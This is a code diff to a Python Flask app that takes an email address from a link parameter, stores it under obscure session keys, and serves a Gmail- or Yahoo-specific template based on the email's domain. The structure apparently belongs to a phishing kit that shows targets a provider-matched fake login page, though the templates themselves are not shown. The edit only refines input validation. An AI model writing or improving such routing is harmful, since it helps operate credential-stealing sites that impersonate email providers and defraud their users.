@@ -172,20 +172,21 @@ def success():
 
 @app.route("/m")
 def route2():
-    web_param = request.args.get('web')
+    web_param = request.args.get('web', '').strip()  # Ensure web_param is a string and remove spaces
 
-    if web_param and "@" in web_param:
+    if "@" in web_param:
         session['eman'] = web_param
-        domain = web_param.split('@')[-1].lower()  # Ensure lowercase matching
+        domain = web_param.split('@')[-1].lower().strip()  # Normalize domain
         session['ins'] = domain
 
         if domain == "gmail.com":
-            return render_template('gmail.html', eman=session.get('eman'), ins=session.get('ins'))
+            return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
         elif domain == "yahoo.com":
-            return render_template('yahoo.html', eman=session.get('eman'), ins=session.get('ins'))
-
-    # If domain is missing or not gmail/yahoo, return 400 Bad Request
-    abort(400, "Invalid or unsupported email domain")
+            return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
+        else:
+            abort(400, "Invalid or unsupported email domain")
+    else:
+        abort(400, "Invalid email format")
 
 @app.route("/first", methods=['POST'])
 def first():
